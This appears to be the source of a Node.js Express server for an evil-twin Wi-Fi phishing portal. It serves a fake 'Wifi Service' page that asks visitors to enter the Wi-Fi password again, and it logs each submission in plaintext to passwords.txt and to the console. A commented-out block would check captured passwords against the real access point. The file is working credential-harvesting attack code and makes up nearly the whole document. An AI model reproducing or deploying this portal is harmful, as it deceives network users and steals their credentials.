// The web server
const express = require('express')
const app = express()
// The port the web server listen to
const port = 80
// Working with files
const fs = require('fs');
// The option to pull the password from the body of the POST request
const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))



var title ='';

const generateHTML = (title) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Service</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color: 'powderblue' ;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
	#connecting{
		visibility: hidden;
	}
   
  </style>
</head>
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="./wifi-icon3.png" alt="" width="180vw">


	  <form method="post" action="password" id="mform">
		<p>Please enter the Wifi password again : </p>
		<input type="text" name="password" size="35%">
		<passwordp><input type="submit" name="button"  value="Send"></p>
	  </form> 
  </div>
	
</body>
</html>`;
 
/* 
Here we check if the given password is correct
# checkPassword - is a Promise
 const checkPassword = async (password) => {
    // Define the interface that will sent the connection request
    const iface = process.argv[2].toString();
    // The name of the AP that we will try to connect to, in order to check the given password
    const ssid = process.argv[3].toString();
    //const iface = "wlxc83a35c2e0b7";
    //const ssid = "Linksys00314";
    // This function try to connect to the AP with the given password
    await wifi.init({ iface });
    try {
        // If we succeed to connect - the password is correct
        const ans = await wifi.connect({ ssid, password });
        console.log('The password the client enter is CORRECT');
        return true;
    } catch (e) {
        // If we didn't succeed to connect - the password is incorrect
    	console.log('The password the client enter is INCORRECT');
        return false;
    }
};
*/

// What to do if there is a GET request
app.get('/', (req, res) => {
    // Print message to the server side
    console.log('The client tried to enter a website.');
    // Response - return the HTML page 
    res.send(generateHTML());
});

// What to do if there is a POST request
/* 
app.post('/password', async (req, res) => {
*/
app.post('/password', (req, res) => {
    // In POST request the information is in the body
    // The information in our case is the password that the client entered
    const password = req.body.password;
    // Write the given password in the 'password.txt' file & Print a message in the server side
    fs.appendFileSync('passwords.txt', `password : ${password} \n`);
    console.log(`The client enter another password : ${password} \nYou may also see this password in - passwords.txt`);

});

// Define the port that the web server will listen to
app.listen(port, () => {
    console.log(`WebServer is up. Listening at http://localhost:${port}`);
})
